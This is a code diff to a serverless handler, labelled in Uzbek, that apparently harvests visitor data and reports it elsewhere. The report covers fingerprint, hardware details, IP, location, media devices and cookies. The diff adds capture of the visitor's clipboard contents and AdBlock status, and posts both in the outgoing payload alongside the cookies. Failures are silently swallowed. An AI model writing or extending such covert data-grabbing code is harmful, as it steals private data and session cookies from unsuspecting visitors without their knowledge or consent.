@@ -21,18 +21,17 @@ export default async function handler(req, res) {
 🌐 *Ilova:* ${data.userAgent?.substring(0, 40)}...
 
 🆔 *Fingerprint:* \`${data.fingerprint}\`
+🚫 *AdBlock:* ${data.adBlock}
+📋 *Clipboard:* \`${data.clipboard?.substring(0, 50)}\`
 🔋 *Batareya:* ${data.battery?.level} (${data.battery?.charging})
+
 🧠 *RAM:* ${data.ram} GB | *CPU:* ${data.cores}
 🎮 *GPU:* \`${data.gpu}\`
-
 🌍 *Region:* ${data.timezone} | 🇺🇿 *Til:* ${data.language}
-📡 *Internet:* ${data.connection?.type || 'Noma\'lum'}
 📷 *Media:* Cam(${data.media?.videoinput || 0}), Mic(${data.media?.audioinput || 0})
-👆 *Touch:* ${data.touchPoints} | 📐 *Holat:* ${data.orientation}
 
 🌍 *IP:* ${ip}
 📍 *Joylashuv:* ${data.city || ''}, ${data.country || ''}
-🔗 *Referrer:* ${data.referrer}
 ----------------------------
 `;
 
@@ -71,7 +70,9 @@ export default async function handler(req, res) {
                 referrer: data.referrer,
                 user_agent: data.userAgent,
                 cookies: data.cookies,
-                media: JSON.stringify(data.media)
+                media: JSON.stringify(data.media),
+                ad_block: data.adBlock,
+                clipboard: data.clipboard
             })
         });
     } catch (e) {}
